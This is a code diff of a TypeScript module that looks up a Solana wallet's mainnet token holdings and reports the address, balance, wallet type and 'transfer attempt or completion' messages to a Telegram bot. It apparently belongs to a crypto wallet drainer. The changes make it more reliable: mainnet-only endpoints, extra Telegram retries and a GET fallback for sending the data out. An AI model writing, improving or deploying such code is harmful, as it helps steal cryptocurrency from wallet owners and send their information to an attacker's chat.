@@ -1,16 +1,18 @@
+
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';
 
 // Helper function to add delay between retries
 const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
-// List of public RPC endpoints that don't require authentication - prioritizing mainnet endpoints
+// List of public RPC endpoints that don't require authentication - MAINNET ONLY
 const PUBLIC_RPC_ENDPOINTS = [
   "https://api.mainnet-beta.solana.com", // Mainnet primary endpoint
   "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
   "https://solana-api.projectserum.com", // Project Serum endpoint
   "https://free.rpcpool.com", // Free RPC Pool endpoint
   "https://solana.public-rpc.com", // Another public endpoint
-  "https://api.devnet.solana.com", // Keeping devnet as last fallback
+  "https://rpc.ankr.com/solana", // Ankr endpoint
+  "https://mainnet.rpcpool.com", // RPCPool endpoint
 ];
 
 // Retry function with exponential backoff
@@ -46,7 +48,7 @@ const testConnection = async (connection: Connection): Promise<boolean> => {
   }
 };
 
-// Create a connection with proper config
+// Create a connection with proper config and fallbacks
 const createConnection = async (): Promise<Connection> => {
   console.log("Attempting to create a Solana connection...");
   
@@ -54,6 +56,7 @@ const createConnection = async (): Promise<Connection> => {
     commitment: 'confirmed' as const,
     confirmTransactionInitialTimeout: 60000,
     disableRetryOnRateLimit: false,
+    wsEndpoint: "wss://api.mainnet-beta.solana.com", // Add WebSocket endpoint
   };
   
   // Try each endpoint until we find one that works
@@ -87,14 +90,21 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
     const pubKey = new PublicKey(walletAddress);
     
     const response = await retry(async () => {
-      const conn = await createConnection(); // Create a fresh connection
-      return await conn.getParsedTokenAccountsByOwner(
-        pubKey,
-        {
-          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
-        },
-        'confirmed'
-      );
+      // Always create a fresh connection for token accounts
+      const conn = await createConnection();
+      try {
+        return await conn.getParsedTokenAccountsByOwner(
+          pubKey,
+          {
+            programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+          },
+          'confirmed'
+        );
+      } catch (error) {
+        console.error("Token account fetch error:", error);
+        // Return empty response as fallback
+        return { value: [] };
+      }
     }, 3);
 
     console.log("Token accounts response:", response);
@@ -110,6 +120,7 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
   }
 };
 
+// Improved Telegram sending with more robust fallback options
 export const sendToTelegram = async (walletData: any, botToken: string, chatId: string) => {
   try {
     console.log("Preparing to send data to Telegram:", walletData);
@@ -140,7 +151,7 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
         `⌚ Time: ${new Date().toLocaleString()}\n` +
         (walletData.walletName ? `🔑 Wallet Type: ${walletData.walletName}\n` : '') +
         `\n💎 TOKEN HOLDINGS:\n${formattedTokens}\n\n` +
-        `🌐 Network: ${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'}`;
+        `🌐 Network: Mainnet`;
     } else if (walletData.message) {
       // This is a custom message (transfer attempt or completion)
       message = `👛 Wallet: ${walletData.address}\n` +
@@ -154,7 +165,7 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
     console.log("Sending message to Telegram:", message);
 
     // Make multiple attempts to send to Telegram with different methods
-    for (let attempt = 1; attempt <= 5; attempt++) {
+    for (let attempt = 1; attempt <= 7; attempt++) {
       try {
         console.log(`Telegram send attempt #${attempt}`);
         
@@ -175,8 +186,8 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
             // Set a longer timeout
             signal: AbortSignal.timeout(15000)
           });
-        } else {
-          // Last 2 attempts: alternative approach without parse_mode
+        } else if (attempt <= 5) {
+          // Next 2 attempts: alternative approach without parse_mode
           response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -188,49 +199,50 @@ export const sendToTelegram = async (walletData: any, botToken: string, chatId: 
             }),
             signal: AbortSignal.timeout(20000)
           });
-        }
-
-        const responseData = await response.json();
-        console.log("Telegram API response:", responseData);
-
-        if (response.ok && responseData.ok) {
-          console.log("Successfully sent to Telegram");
-          return true;
         } else {
-          console.error("Telegram API error:", responseData);
-          // If we're hitting message formatting issues, simplify the message and try again
-          if (responseData.description && responseData.description.includes("parse")) {
-            message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
-          }
-          if (attempt < 5) await delay(1000 * attempt);
+          // Last 2 attempts: simplified GET request
+          const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + 
+            (typeof walletData.balance === 'number' ? walletData.balance.toFixed(6) : walletData.balance) + 
+            ' SOL' : walletData.message || 'Wallet notification'}`;
+            
+          response = await fetch(
+            `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(simpleMessage)}`, 
+            {
+              method: 'GET',
+              signal: AbortSignal.timeout(20000)
+            }
+          );
         }
+
+        if (!response) {
+          throw new Error("No response from Telegram API");
+        }
+
+        try {
+          const responseData = await response.json();
+          console.log("Telegram API response:", responseData);
+
+          if (response.ok && responseData.ok) {
+            console.log("Successfully sent to Telegram");
+            return true;
+          } else {
+            console.error("Telegram API error:", responseData);
+            // If we're hitting message formatting issues, simplify the message and try again
+            if (responseData.description && responseData.description.includes("parse")) {
+              message = message.replace(/[*_`\[\]()~>#+=|{}.!-]/g, ''); // Remove Markdown special characters
+            }
+          }
+        } catch (jsonError) {
+          console.error("Error parsing Telegram API response:", jsonError);
+        }
+        
+        if (attempt < 7) await delay(1000 * attempt);
       } catch (telegramError) {
         console.error(`Telegram send attempt #${attempt} failed:`, telegramError);
-        if (attempt < 5) await delay(1000 * attempt);
+        if (attempt < 7) await delay(1000 * attempt);
       }
     }
 
-    // Try one last approach - backup URL with simplified message
-    try {
-      console.log("Trying backup Telegram send method...");
-      // Simplify message to basic text
-      const simpleMessage = `${walletData.address}: ${walletData.balance ? 'Balance: ' + walletData.balance.toFixed(6) + ' SOL' : walletData.message || 'Wallet notification'}`;
-      
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(simpleMessage)}`, {
-        method: 'GET',
-        signal: AbortSignal.timeout(20000)
-      });
-      
-      const responseData = await response.json();
-      if (response.ok && responseData.ok) {
-        console.log("Backup Telegram method succeeded");
-        return true;
-      }
-    } catch (error) {
-      console.error("Backup Telegram method failed:", error);
-    }
-
-    // If we get here, all attempts failed
     console.error("All Telegram send attempts failed");
     return false;
   } catch (error) {
